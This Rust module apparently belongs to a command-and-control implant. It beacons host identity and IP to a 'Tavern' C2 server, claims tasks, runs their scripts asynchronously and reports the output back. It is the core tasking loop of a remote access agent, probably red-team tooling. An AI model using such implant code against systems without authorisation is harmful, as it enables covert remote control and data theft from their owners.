use std::collections::HashMap;
use std::time::{Duration, Instant};

use crate::exec::{handle_exec_timeout_and_response, AsyncTask};
use crate::init::AgentProperties;
use crate::Config;
use anyhow::{Context, Result};
use c2::pb::c2_client::C2Client;
use c2::pb::{
    Agent, Beacon, ClaimTasksRequest, Host, ReportTaskOutputRequest, ReportTaskOutputResponse,
    Task, TaskOutput,
};
use chrono::Utc;
use std::sync::mpsc::channel;
use tokio::task;
use tonic::transport::Channel;
use tonic::Status;

pub async fn get_new_tasks(
    agent_properties: AgentProperties,
    imix_config: Config,
    mut tavern_client: C2Client<Channel>,
) -> Result<Vec<Task>> {
    let req = tonic::Request::new(ClaimTasksRequest {
        beacon: Some(Beacon {
            identifier: agent_properties.beacon_id.clone(),
            principal: agent_properties.principal.clone(),
            host: Some(Host {
                identifier: agent_properties.host_id.clone(),
                name: agent_properties.hostname.clone(),
                platform: agent_properties.host_platform.try_into()?,
                primary_ip: agent_properties
                    .primary_ip
                    .clone()
                    .context("primary ip not found")?,
            }),
            agent: Some(Agent {
                identifier: agent_properties.agent_id.clone(),
            }),
            interval: imix_config.callback_config.interval,
        }),
    });
    let new_tasks = match tavern_client.claim_tasks(req).await {
        Ok(resp) => resp.get_ref().tasks.clone(),
        Err(error) => {
            #[cfg(debug_assertions)]
            eprintln!("main_loop: error claiming task\n{:?}", error);
            let empty_vec = vec![];
            empty_vec
        }
    };
    Ok(new_tasks)
}

pub async fn start_new_tasks(
    new_tasks: Vec<Task>,
    all_exec_futures: &mut HashMap<i64, AsyncTask>,
    debug_start_time: Instant,
) -> Result<()> {
    for task in new_tasks {
        #[cfg(debug_assertions)]
        eprintln!("Parameters:\n{:?}", task.clone().parameters);
        #[cfg(debug_assertions)]
        eprintln!("Launching:\n{:?}", task.clone().eldritch);

        let (sender, receiver) = channel::<String>();
        let exec_with_timeout =
            handle_exec_timeout_and_response(task.clone(), sender.clone(), None);

        #[cfg(debug_assertions)]
        eprintln!(
            "[{}]: Queueing task {}",
            (Instant::now() - debug_start_time).as_millis(),
            task.clone().id
        );

        match all_exec_futures.insert(
            task.clone().id,
            AsyncTask {
                future_join_handle: task::spawn(exec_with_timeout),
                start_time: Utc::now(),
                grpc_task: task.clone(),
                print_reciever: receiver,
            },
        ) {
            Some(_old_task) => {
                #[cfg(debug_assertions)]
                eprintln!("main_loop: error adding new task. Non-unique taskID\n");
            }
            None => {
                #[cfg(debug_assertions)]
                eprintln!("main_loop: Task queued successfully\n");
            } // Task queued successfully
        }

        #[cfg(debug_assertions)]
        eprintln!(
            "[{}]: Queued task {}",
            (Instant::now() - debug_start_time).as_millis(),
            task.clone().id
        );
    }
    Ok(())
}

pub async fn submit_task_output(
    loop_start_time: Instant,
    mut tavern_client: C2Client<Channel>,
    all_exec_futures: &mut HashMap<i64, AsyncTask>,
    running_task_res_map: &mut HashMap<i64, Vec<TaskOutput>>,
) -> Result<()> {
    let mut running_exec_futures: HashMap<i32, AsyncTask> = HashMap::new();

    for (task_id, async_task) in all_exec_futures {
        #[cfg(debug_assertions)]
        eprintln!(
            "[{}]: Task # {} is_finished? {}",
            (Instant::now() - loop_start_time).as_millis(),
            task_id,
            async_task.future_join_handle.is_finished()
        );

        let mut task_channel_output: Vec<String> = vec![];

        // Loop over each line of output from the task and append it the the channel output.
        loop {
            #[cfg(debug_assertions)]
            eprintln!(
                "[{}]: Task # {} recieving output",
                (Instant::now() - loop_start_time).as_millis(),
                task_id
            );
            let new_res_line = match async_task
                .print_reciever
                .recv_timeout(Duration::from_millis(100))
            {
                Ok(local_res_string) => local_res_string,
                Err(local_err) => {
                    match local_err.to_string().as_str() {
                        "channel is empty and sending half is closed" => {
                            break;
                        }
                        "timed out waiting on channel" => {
                            break;
                        }
                        _ => eprint!("Error: {}", local_err),
                    }
                    break;
                }
            };
            // let appended_line = format!("{}{}", res.to_owned(), new_res_line);
            task_channel_output.push(new_res_line);
        }

        let task_is_finished = async_task.future_join_handle.is_finished();
        let task_response_exec_finished_at = match task_is_finished {
            true => Some(Utc::now()),
            false => None,
        };

        // If the task is finished or there's new data queue a new task result.
        if task_is_finished || task_channel_output.len() > 0 {
            let task_response = TaskOutput {
                id: async_task.grpc_task.id.clone(),
                exec_started_at: Some(prost_types::Timestamp {
                    seconds: async_task.start_time.timestamp(),
                    nanos: async_task.start_time.timestamp_subsec_nanos() as i32,
                }),
                exec_finished_at: match task_response_exec_finished_at {
                    Some(timestamp) => Some(prost_types::Timestamp {
                        seconds: timestamp.timestamp(),
                        nanos: timestamp.timestamp_subsec_nanos() as i32,
                    }),
                    None => None,
                },
                output: task_channel_output.join("\n"),
                error: None,
            };

            running_task_res_map
                .entry(*task_id)
                .and_modify(|cur_list| cur_list.push(task_response.clone()))
                .or_insert(vec![task_response]);
        }

        running_exec_futures.retain(|_index, exec_task| exec_task.future_join_handle.is_finished())
    }

    // Iterate over queued task results and send them back to the server
    for (task_id, task_res) in running_task_res_map.clone().into_iter() {
        for output in task_res {
            match send_tavern_output(&mut tavern_client, output).await {
                Ok(_) => {
                    // Remove output that has been reported sucessfully.
                    running_task_res_map.remove(&task_id);
                }
                Err(local_err) => {
                    #[cfg(debug_assertions)]
                    eprintln!("Failed to submit task resluts:\n{}", local_err.to_string());
                    {}
                }
            };
        }
    }

    Ok(())
}

async fn send_tavern_output(
    tavern_client: &mut C2Client<Channel>,
    output: TaskOutput,
) -> Result<tonic::Response<ReportTaskOutputResponse>, Status> {
    let req = tonic::Request::new(ReportTaskOutputRequest {
        output: Some(output),
    });
    tavern_client.report_task_output(req).await
}
